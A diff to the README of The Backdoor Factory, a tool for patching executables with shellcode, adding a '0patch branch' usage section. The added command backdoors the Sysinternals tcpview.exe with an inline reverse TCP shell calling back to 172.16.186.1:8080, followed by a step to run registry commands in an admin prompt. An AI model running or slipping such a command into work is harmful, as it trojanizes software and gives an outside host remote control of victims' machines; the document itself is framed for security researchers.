@@ -1,9 +1,15 @@
 
-##The Backdoor Factory (BDF)
+##The Backdoor Factory (BDF) 0patch BRANCH
 
 For security professionals and researchers only.
 
+### USAGE WITH 0PATCH
 
+```
+./backdoor.py -f tcpview.exe -s reverse_shell_tcp_inline -P 8080 -H 172.16.186.1 -a
+```
+
+Then copy the reg commands to a Admin cmd.exe prompt for a system running 0patch
 
 The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.
 
